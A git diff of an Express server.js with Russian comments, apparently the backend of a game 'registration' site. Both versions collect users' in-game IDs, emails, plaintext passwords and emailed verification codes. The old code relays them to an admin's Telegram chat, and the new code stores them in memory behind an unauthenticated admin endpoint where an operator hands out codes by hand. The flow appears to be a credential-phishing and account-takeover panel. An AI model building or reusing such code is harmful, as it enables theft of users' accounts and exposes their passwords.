@@ -1,273 +1,362 @@
-// server.js (COMMONJS)
+// server.js (COMMONJS, admin HTML instead of Telegram)
 
 const path = require("path");
 const express = require("express");
+const morgan = require("morgan");
 
 const app = express();
-
-// ===== ENV =====
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // твой chat id
 const PORT = process.env.PORT || 3000;
 
-if (!TELEGRAM_BOT_TOKEN) {
-  console.warn("[WARN] TELEGRAM_BOT_TOKEN is not set");
-}
-if (!ADMIN_CHAT_ID) {
-  console.warn("[WARN] ADMIN_CHAT_ID is not set");
-}
-
-const TELEGRAM_API = TELEGRAM_BOT_TOKEN
-  ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
-  : null;
-
 // ===== MIDDLEWARE =====
+app.use(morgan("dev"));
 app.use(express.json());
 
-// статика: /public (index.html, soon.html, картинки и т.д.)
+// ===== STATIC =====
 const PUBLIC_DIR = path.join(__dirname, "public");
-app.use(express.static(PUBLIC_DIR));
+
+app.use(
+  express.static(PUBLIC_DIR, {
+    maxAge: "1h",
+    index: "index.html",
+  })
+);
 
 // health-check для Render
 app.get("/healthz", (req, res) => {
   res.json({ ok: true });
 });
 
-// корневой маршрут
+// корень — основной сайт / хаб
 app.get("/", (req, res) => {
   res.sendFile(path.join(PUBLIC_DIR, "index.html"));
 });
 
-// ===== TELEGRAM HELPERS =====
+// админка — public/admin/index.html
+app.get("/admin", (req, res) => {
+  res.sendFile(path.join(PUBLIC_DIR, "admin", "index.html"));
+});
 
-async function telegramRequest(method, payload) {
-  if (!TELEGRAM_API) {
-    console.error("[TG] Missing TELEGRAM_BOT_TOKEN, cannot call Telegram API");
-    return { ok: false };
-  }
+// ===== IN-MEMORY STORAGE (для теста; после рестарта всё очищается) =====
 
-  try {
-    const res = await fetch(`${TELEGRAM_API}/${method}`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
+let idCodeRequests = [];     // запросы на код для айди
+let emailCodeRequests = [];  // запросы на код для почты
+let registrations = [];      // финальные заявки
+let seq = 1;
 
-    const data = await res.json();
-    if (!data.ok) {
-      console.error(`[TG] ${method} error:`, data);
-    }
-    return data;
-  } catch (err) {
-    console.error(`[TG] ${method} fetch error:`, err);
-    return { ok: false };
-  }
+function genId() {
+  return String(seq++);
 }
 
-function sendTelegramMessage(chatId, text, extra = {}) {
-  return telegramRequest("sendMessage", {
-    chat_id: chatId,
-    text,
-    ...extra,
-  });
+function generateCode() {
+  return String(Math.floor(100000 + Math.random() * 900000)); // 6 цифр
 }
 
-// ===== API: /api/notify-admin =====
+// ===== PUBLIC API (frontend регистрации) =====
 
-app.post("/api/notify-admin", async (req, res) => {
+// 1) запрос кода для ID
+// body: { accessCode, ingameId, email }
+app.post("/api/request-id-code", (req, res) => {
+  const { accessCode, ingameId, email } = req.body || {};
+
+  if (!accessCode || !ingameId || !email) {
+    return res.status(400).json({ ok: false, error: "missing_fields" });
+  }
+
+  const now = new Date().toISOString();
+
+  let rec = idCodeRequests.find(
+    (r) =>
+      r.accessCode === accessCode &&
+      r.ingameId === ingameId &&
+      r.email === email
+  );
+
+  if (!rec) {
+    rec = {
+      id: genId(),
+      accessCode,
+      ingameId,
+      email,
+      status: "pending", // pending | code_sent | valid | invalid
+      lastCode: null,
+      createdAt: now,
+    };
+    idCodeRequests.push(rec);
+  }
+
+  console.log("[ID REQUEST]", rec);
+  return res.json({ ok: true, id: rec.id });
+});
+
+// 2) проверка кода для ID
+// body: { accessCode, ingameId, email, code }
+app.post("/api/verify-id-code", (req, res) => {
+  const { accessCode, ingameId, email, code } = req.body || {};
+
+  if (!accessCode || !ingameId || !email || !code) {
+    return res.status(400).json({ status: "invalid", error: "missing_fields" });
+  }
+
+  const rec = idCodeRequests.find(
+    (r) =>
+      r.accessCode === accessCode &&
+      r.ingameId === ingameId &&
+      r.email === email
+  );
+
+  if (!rec || !rec.lastCode) {
+    // код ещё не сгенерён / не отправлен
+    return res.json({ status: "pending" });
+  }
+
+  if (rec.lastCode === String(code).trim()) {
+    rec.status = "valid";
+    return res.json({ status: "valid" });
+  } else {
+    rec.status = "invalid";
+    return res.json({ status: "invalid" });
+  }
+});
+
+// 3) запрос кода для EMAIL
+// body: { accessCode, email, ingameId? }
+app.post("/api/request-email-code", (req, res) => {
+  const { accessCode, email, ingameId } = req.body || {};
+
+  if (!accessCode || !email) {
+    return res.status(400).json({ ok: false, error: "missing_fields" });
+  }
+
+  const now = new Date().toISOString();
+
+  let rec = emailCodeRequests.find(
+    (r) => r.accessCode === accessCode && r.email === email
+  );
+
+  if (!rec) {
+    rec = {
+      id: genId(),
+      accessCode,
+      email,
+      ingameId: ingameId || null,
+      status: "pending", // pending | code_sent | valid | invalid
+      lastCode: null,
+      createdAt: now,
+    };
+    emailCodeRequests.push(rec);
+  }
+
+  console.log("[EMAIL REQUEST]", rec);
+  return res.json({ ok: true, id: rec.id });
+});
+
+// 4) проверка кода для EMAIL
+// body: { accessCode, email, code }
+app.post("/api/verify-email-code", (req, res) => {
+  const { accessCode, email, code } = req.body || {};
+
+  if (!accessCode || !email || !code) {
+    return res.status(400).json({ status: "invalid", error: "missing_fields" });
+  }
+
+  const rec = emailCodeRequests.find(
+    (r) => r.accessCode === accessCode && r.email === email
+  );
+
+  if (!rec || !rec.lastCode) {
+    return res.json({ status: "pending" });
+  }
+
+  if (rec.lastCode === String(code).trim()) {
+    rec.status = "valid";
+    return res.json({ status: "valid" });
+  } else {
+    rec.status = "invalid";
+    return res.json({ status: "invalid" });
+  }
+});
+
+// 5) финальная заявка (после двух кодов)
+// body: { accessCode, ingameId, email, password?, idCode?, emailCode? }
+app.post("/api/submit-registration", (req, res) => {
   const {
-    type,
     accessCode,
     ingameId,
     email,
     password,
+    idCode,
     emailCode,
   } = req.body || {};
 
-  if (!type) {
-    return res.status(400).json({ ok: false, error: "missing_type" });
+  if (!accessCode || !ingameId || !email) {
+    return res.status(400).json({ ok: false, error: "missing_fields" });
   }
 
-  try {
-    if (type === "email_code_request") {
-      // ПЕРВОЕ сообщение: сразу с паролем
-      const text =
-        "✉️ <b>Email code request</b>\n" +
-        "\nType: <code>email_code_request</code>" +
-        `\nAccess code: <code>${accessCode || "-"}</code>` +
-        `\nIn-game ID: <code>${ingameId || "-"}</code>` +
-        `\nEmail: <code>${email || "-"}</code>` +
-        `\nPassword: <code>${password || "-"}</code>` +
-        "\n\n⬆️ Проверь данные и отправь пользователю верификационный код на почту.";
-
-      const replyMarkup = {
-        inline_keyboard: [
-          [
-            { text: "✅ Approve email", callback_data: "APPROVE_EMAIL" },
-            { text: "❌ Deny / wrong data", callback_data: "DENY_EMAIL" },
-          ],
-        ],
-      };
-
-      const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
-        parse_mode: "HTML",
-        reply_markup: replyMarkup,
-      });
-
-      return res.json({ ok: tgRes.ok });
-    }
-
-    if (type === "full_application_fallback") {
-      const text =
-        "⚠️ <b>Registration application (fallback)</b>\n" +
-        "\nType: <code>full_application_fallback</code>" +
-        `\nAccess code: <code>${accessCode || "-"}</code>` +
-        `\nIn-game ID: <code>${ingameId || "-"}</code>` +
-        `\nEmail: <code>${email || "-"}</code>` +
-        (emailCode
-          ? `\nEmail code: <code>${emailCode}</code>`
-          : "") +
-        `\nPassword: <code>${password || "-"}</code>` +
-        "\n\n🚨 Бекенд вернул ошибку. Заявка отправлена через fallback, проверь вручную.";
-
-      const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
-        parse_mode: "HTML",
-      });
-
-      return res.json({ ok: tgRes.ok });
-    }
-
-    const text =
-      "ℹ️ <b>Unknown notify-admin type</b>\n" +
-      `\nType: <code>${type}</code>` +
-      `\nAccess code: <code>${accessCode || "-"}</code>` +
-      `\nIn-game ID: <code>${ingameId || "-"}</code>` +
-      `\nEmail: <code>${email || "-"}</code>` +
-      (emailCode ? `\nEmail code: <code>${emailCode}</code>` : "") +
-      (password ? `\nPassword: <code>${password}</code>` : "");
-
-    const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
-      parse_mode: "HTML",
-    });
-
-    return res.json({ ok: tgRes.ok });
-  } catch (err) {
-    console.error("[/api/notify-admin] error:", err);
-    return res.status(500).json({ ok: false, error: "server_error" });
-  }
-});
-
-// ===== API: /api/submit-registration =====
-
-app.post("/api/submit-registration", async (req, res) => {
-  const { accessCode, ingameId, email, password, emailCode } = req.body || {};
-
-  if (!ingameId || !email || !password) {
-    return res.status(400).json({
-      ok: false,
-      error: "missing_fields",
-    });
-  }
-
-  const textParts = [
-    "📝 <b>Registration application</b>",
-    "",
-    `Access code: <code>${accessCode || "-"}</code>`,
-    `In-game ID: <code>${ingameId}</code>`,
-    `Email: <code>${email}</code>`,
-  ];
-
-  if (emailCode) {
-    textParts.push(`Email code: <code>${emailCode}</code>`);
-  }
-
-  textParts.push(`Password: <code>${password}</code>`);
-  textParts.push(
-    "",
-    "ℹ️ Пользователь встал в зону ожидания (waiting zone).",
-    "Решение (approve / deny / отправить новый код) принимается только вручную через тебя."
+  const idReq = idCodeRequests.find(
+    (r) =>
+      r.accessCode === accessCode &&
+      r.ingameId === ingameId &&
+      r.email === email
+  );
+  const emailReq = emailCodeRequests.find(
+    (r) => r.accessCode === accessCode && r.email === email
   );
 
-  const text = textParts.join("\n");
+  const idVerified = !!idReq && idReq.status === "valid";
+  const emailVerified = !!emailReq && emailReq.status === "valid";
 
-  try {
-    const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
-      parse_mode: "HTML",
-    });
+  const reg = {
+    id: genId(),
+    accessCode,
+    ingameId,
+    email,
+    password: password || null,
+    idCode: idCode || null,
+    emailCode: emailCode || null,
+    idVerified,
+    emailVerified,
+    status: "pending", // pending | approved | declined
+    createdAt: new Date().toISOString(),
+    declineReason: null,
+    adminNote: null,
+    slot: null,
+    link: null,
+  };
 
-    if (!tgRes.ok) {
-      return res.status(500).json({ ok: false, error: "telegram_error" });
-    }
+  registrations.push(reg);
 
-    const uid = String(Date.now());
-    return res.json({ ok: true, status: "ok", uid });
-  } catch (err) {
-    console.error("[/api/submit-registration] error:", err);
-    return res.status(500).json({ ok: false, error: "server_error" });
-  }
+  console.log("[REGISTRATION SUBMITTED]", reg);
+  return res.json({ ok: true, id: reg.id });
 });
 
-// ===== TELEGRAM WEBHOOK =====
+// ===== ADMIN API (для HTML-админки) =====
 
-app.post("/telegram/webhook", async (req, res) => {
-  const update = req.body;
+// общее состояние: заявки на ID, EMAIL и финальные регистрации
+app.get("/admin/api/state", (req, res) => {
+  res.json({
+    idCodeRequests,
+    emailCodeRequests,
+    registrations,
+  });
+});
 
-  try {
-    if (update.callback_query) {
-      const cq = update.callback_query;
-      const data = cq.data;
-      const chatId = cq.message.chat.id;
-      const messageId = cq.message.message_id;
+// --- ID CODE admin actions ---
 
-      if (data === "APPROVE_EMAIL") {
-        await telegramRequest("editMessageReplyMarkup", {
-          chat_id: chatId,
-          message_id: messageId,
-          reply_markup: { inline_keyboard: [] },
-        });
+app.post("/admin/api/id-code/generate", (req, res) => {
+  const { id } = req.body || {};
+  const rec = idCodeRequests.find((r) => r.id === String(id));
+  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
 
-        await telegramRequest("answerCallbackQuery", {
-          callback_query_id: cq.id,
-          text: "✅ Пометил как APPROVED (на сайт это не влияет).",
-          show_alert: false,
-        });
+  const code = generateCode();
+  rec.lastCode = code;
+  rec.status = "code_sent";
 
-        await sendTelegramMessage(
-          chatId,
-          "✅ Email / данные помечены как APPROVED. Отправь пользователю код и продолжай вручную.",
-          {}
-        );
-      } else if (data === "DENY_EMAIL") {
-        await telegramRequest("editMessageReplyMarkup", {
-          chat_id: chatId,
-          message_id: messageId,
-          reply_markup: { inline_keyboard: [] },
-        });
+  console.log("[ADMIN] Generated ID code", code, "for", rec.email, rec.ingameId);
+  // TODO: здесь отправка письма rec.email с этим кодом
+  res.json({ ok: true, code });
+});
 
-        await telegramRequest("answerCallbackQuery", {
-          callback_query_id: cq.id,
-          text: "❌ Пометил как DENIED (на сайт это не влияет).",
-          show_alert: false,
-        });
+app.post("/admin/api/id-code/mark-valid", (req, res) => {
+  const { id } = req.body || {};
+  const rec = idCodeRequests.find((r) => r.id === String(id));
+  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
 
-        await sendTelegramMessage(
-          chatId,
-          "❌ Заявка помечена как DENIED / некорректная. Напиши пользователю отказ, если нужно.",
-          {}
-        );
-      } else {
-        await telegramRequest("answerCallbackQuery", {
-          callback_query_id: cq.id,
-          text: "👍 Принято.",
-          show_alert: false,
-        });
-      }
-    }
-  } catch (err) {
-    console.error("[/telegram/webhook] error:", err);
-  }
+  rec.status = "valid";
+  res.json({ ok: true });
+});
 
-  res.sendStatus(200);
+app.post("/admin/api/id-code/mark-invalid", (req, res) => {
+  const { id } = req.body || {};
+  const rec = idCodeRequests.find((r) => r.id === String(id));
+  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
+
+  rec.status = "invalid";
+  res.json({ ok: true });
+});
+
+// --- EMAIL CODE admin actions ---
+
+app.post("/admin/api/email-code/generate", (req, res) => {
+  const { id } = req.body || {};
+  const rec = emailCodeRequests.find((r) => r.id === String(id));
+  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
+
+  const code = generateCode();
+  rec.lastCode = code;
+  rec.status = "code_sent";
+
+  console.log("[ADMIN] Generated EMAIL code", code, "for", rec.email);
+  // TODO: здесь отправка письма rec.email с кодом
+  res.json({ ok: true, code });
+});
+
+app.post("/admin/api/email-code/mark-valid", (req, res) => {
+  const { id } = req.body || {};
+  const rec = emailCodeRequests.find((r) => r.id === String(id));
+  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
+
+  rec.status = "valid";
+  res.json({ ok: true });
+});
+
+app.post("/admin/api/email-code/mark-invalid", (req, res) => {
+  const { id } = req.body || {};
+  const rec = emailCodeRequests.find((r) => r.id === String(id));
+  if (!rec) return res.status(404).json({ ok: false, error: "not_found" });
+
+  rec.status = "invalid";
+  res.json({ ok: true });
+});
+
+// --- REGISTRATION admin actions ---
+
+// APPROVE: выдать слот и ссылку
+// body: { id, slot, link, note }
+app.post("/admin/api/registration/approve", (req, res) => {
+  const { id, slot, link, note } = req.body || {};
+  const reg = registrations.find((r) => r.id === String(id));
+  if (!reg) return res.status(404).json({ ok: false, error: "not_found" });
+
+  reg.status = "approved";
+  reg.slot = slot || null;
+  reg.link = link || null;
+  reg.adminNote = note || null;
+
+  console.log(
+    "[ADMIN] APPROVED",
+    reg.email,
+    "slot=",
+    slot,
+    "link=",
+    link,
+    "note=",
+    note
+  );
+  // TODO: отправить на reg.email письмо с таймингом и ссылкой на игру
+  res.json({ ok: true });
+});
+
+// DECLINE: отклонить с причиной
+// body: { id, reason, note }
+app.post("/admin/api/registration/decline", (req, res) => {
+  const { id, reason, note } = req.body || {};
+  const reg = registrations.find((r) => r.id === String(id));
+  if (!reg) return res.status(404).json({ ok: false, error: "not_found" });
+
+  reg.status = "declined";
+  reg.declineReason = reason || "other";
+  reg.adminNote = note || null;
+
+  console.log(
+    "[ADMIN] DECLINED",
+    reg.email,
+    "reason=",
+    reason,
+    "note=",
+    note
+  );
+  // TODO: отправить на reg.email письмо с причиной отказа
+  res.json({ ok: true });
 });
 
 // ===== START SERVER =====
